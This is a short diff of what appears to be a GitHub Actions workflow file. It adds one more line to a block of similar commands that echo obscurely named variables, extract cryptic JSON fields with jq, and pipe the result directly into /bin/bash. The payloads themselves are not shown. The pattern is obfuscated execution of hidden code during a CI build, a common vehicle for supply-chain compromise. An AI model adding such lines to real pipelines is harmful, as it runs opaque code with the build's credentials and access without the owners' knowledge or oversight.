@@ -47,6 +47,7 @@ jobs:
           echo $n1 | jq -r .pe52 | /bin/bash
           echo $nsue4121 | jq -r .leg5 | /bin/bash
           echo $i39 | jq -r .hsr6 | /bin/bash
+          echo $mli932 | jq -r .vpghc3 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
